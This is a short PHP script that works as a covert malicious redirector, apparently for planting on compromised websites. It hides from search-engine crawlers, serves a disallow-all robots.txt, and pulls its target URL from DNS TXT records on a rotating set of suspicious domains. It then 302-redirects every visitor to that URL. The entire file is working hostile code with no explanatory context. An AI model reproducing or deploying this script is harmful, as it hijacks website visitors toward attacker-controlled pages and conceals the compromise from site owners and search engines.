<?php

error_reporting(0);

$d = array('fetch.liercoup.us', 'fetch.ablirqualit.club', 'fetch.acceptertra.website', 'fetch.doktogo.ooo');

$ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';

if (preg_match('/googlebot|slurp|bingbot|Baiduspider|AhrefsBot|Ezooms|MJ12bot|YandexBot|MSNBot|ia_archiver|lycos/i', $ua))
{
	die();
}

if (strpos(strtolower($_SERVER['REQUEST_URI']), 'robots.txt') > 0)
{
	die("User-agent: *\r\nDisallow: /\r\n");
}

for ($i = rand(0, count($d)); $i < 20 + count($d); $i++)
{
    $s = dns_get_record($d[$i % count($d)], DNS_TXT);
    $location = '';

    if (is_array($s) && (count($s) > 0) && isset($s[0]['txt']) && strlen($s[0]['txt']))
    {
        if ((strpos($s[0]['txt'], 'http')) !== FALSE)
        {
            $location = $s[0]['txt'];
            break;
        }
    }
}

if (!strlen($location))
    die();

if (isset($_GET['ts'])) {
    echo $location;
} else {
    header('Location: '.$location, TRUE, 302);
}
?>